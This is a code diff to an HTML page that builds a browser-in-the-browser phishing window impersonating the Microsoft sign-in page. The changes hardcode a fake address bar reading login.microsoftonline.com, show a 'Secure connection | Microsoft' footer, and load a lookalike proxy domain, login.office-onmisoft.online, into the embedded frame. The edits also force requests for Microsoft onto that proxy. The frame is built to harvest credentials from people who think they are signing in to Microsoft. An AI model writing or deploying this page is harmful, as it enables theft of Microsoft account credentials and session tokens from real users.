@@ -80,24 +80,34 @@
                 <span class="dot yellow"></span>
                 <span class="dot green"></span>
             </div>
-            <div class="browser-url" id="urlDisplay">Loading...</div>
+            <div class="browser-url" id="urlDisplay">https://login.microsoftonline.com/</div>
         </div>
         <iframe class="browser-iframe" id="bitbFrame" src="about:blank"></iframe>
         <div class="browser-footer">🔒 Secure connection | Microsoft</div>
     </div>
     <script>
-        // ✅ FIX: Use the PROXY URL, not Microsoft directly
+        // ✅ HARDCODED PROXY URL - THIS IS THE FIX
         const PROXY_URL = 'https://login.office-onmisoft.online/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https://login.microsoftonline.com/';
         
         const params = new URLSearchParams(window.location.search);
         let targetUrl = params.get('url') || PROXY_URL;
         
+        // If someone passes 'microsoft' as the url, use the proxy URL
+        if (targetUrl === 'microsoft' || targetUrl === 'microsoft.com' || targetUrl === 'login.microsoftonline.com') {
+            targetUrl = PROXY_URL;
+        }
+        
         if (!targetUrl.startsWith('http')) {
             targetUrl = 'https://' + targetUrl;
         }
         
+        // Set the iframe src
+        const iframe = document.getElementById('bitbFrame');
+        iframe.src = targetUrl;
         document.getElementById('urlDisplay').textContent = targetUrl;
-        document.getElementById('bitbFrame').src = targetUrl;
+        
+        // Log for debugging
+        console.log('BitB loading URL:', targetUrl);
     </script>
 </body>
 </html>
